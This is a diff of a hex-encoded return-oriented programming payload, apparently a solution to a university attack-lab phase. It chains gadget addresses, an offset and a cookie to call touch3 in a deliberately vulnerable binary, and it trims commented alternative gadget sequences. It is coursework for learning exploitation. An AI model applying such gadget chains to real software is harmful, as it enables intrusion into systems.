@@ -5,29 +5,15 @@
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
-/* 8步做法 */
-11 1a 40 00 00 00 00 00 /* 0x401a11: mov %rsp,%rax; retq  存rsp，希望+0x48 */
-b5 19 40 00 00 00 00 00 /* 0x4019b5: mov %rax,%rdi; nop; retq  用来改rdi */
-dd 19 40 00 00 00 00 00 /* 0x4019dd: pop %rax; nop; nop; retq  任意改rax */
-48 00 00 00 00 00 00 00 /* 0x48，偏移量 */
-95 1a 40 00 00 00 00 00 /* 0x401a95: mov %eax,%edx; retq  把eax暂存edx */
-55 1a 40 00 00 00 00 00 /* 0x401a55: mov %edx,%ecx; and %dl,%dl; retq  改%ecx */
-7f 1a 40 00 00 00 00 00 /* 0x401a7f: mov %ecx,%esi; js 0x401a4c <setval_313>; retq  改esi，现在esi存0x48 */
-e8 19 40 00 00 00 00 00 /* 0x4019e8: lea (%rdi,%rsi,1),%rax; retq  用来做加法 */
-b5 19 40 00 00 00 00 00 /* 0x4019b5: mov %rax,%rdi; nop; retq  只有这一个用来改rdi */
-09 19 40 00 00 00 00 00 /* 用来调用touch3 */
-37 32 33 32 36 39 39 32 /* cookie */
 
-
-/* 7步做法
-11 1a 40 00 00 00 00 00 /* 0x401a11: mov %rsp,%rax; retq  存rsp，希望+0x40 */
-b5 19 40 00 00 00 00 00 /* 0x4019b5: mov %rax,%rdi; nop; retq  只有这一个用来改rdi */
-dd 19 40 00 00 00 00 00 /* 0x4019dd: pop %rax; nop; nop; retq  任意改rax */
-40 00 00 00 00 00 00 00 /* 0x40，偏移量 */
-da 19 40 00 00 00 00 00 /* 0x4019da: xchg %eax,%ecx; retq  把eax和ecx交换 */
-7f 1a 40 00 00 00 00 00 /* 0x401a7f: mov %ecx,%esi; js 0x401a4c <setval_313>; retq  改esi，现在esi存0x40 */
-e8 19 40 00 00 00 00 00 /* 0x4019e8: lea (%rdi,%rsi,1),%rax; retq  用来做加法 */
-b5 19 40 00 00 00 00 00 /* 0x4019b5: mov %rax,%rdi; nop; retq  只有这一个用来改rdi */
-09 19 40 00 00 00 00 00 /* 用来调用touch3 */
+11 1a 40 00 00 00 00 00 /* 0x401a11: mov %rsp,%rax; retq */
+b5 19 40 00 00 00 00 00 /* 0x4019b5: mov %rax,%rdi; nop; retq */
+dd 19 40 00 00 00 00 00 /* 0x4019dd: pop %rax; nop; nop; retq */
+48 00 00 00 00 00 00 00 /* 0x48 */
+95 1a 40 00 00 00 00 00 /* 0x401a95: mov %eax,%edx; retq */
+55 1a 40 00 00 00 00 00 /* 0x401a55: mov %edx,%ecx; and %dl,%dl; retq */
+7f 1a 40 00 00 00 00 00 /* 0x401a7f: mov %ecx,%esi; js 0x401a4c <setval_313>; retq */
+e8 19 40 00 00 00 00 00 /* 0x4019e8: lea (%rdi,%rsi,1),%rax; retq */
+b5 19 40 00 00 00 00 00 /* 0x4019b5: mov %rax,%rdi; nop; retq */
+09 19 40 00 00 00 00 00 /* touch3 */
 37 32 33 32 36 39 39 32 /* cookie */
-*/
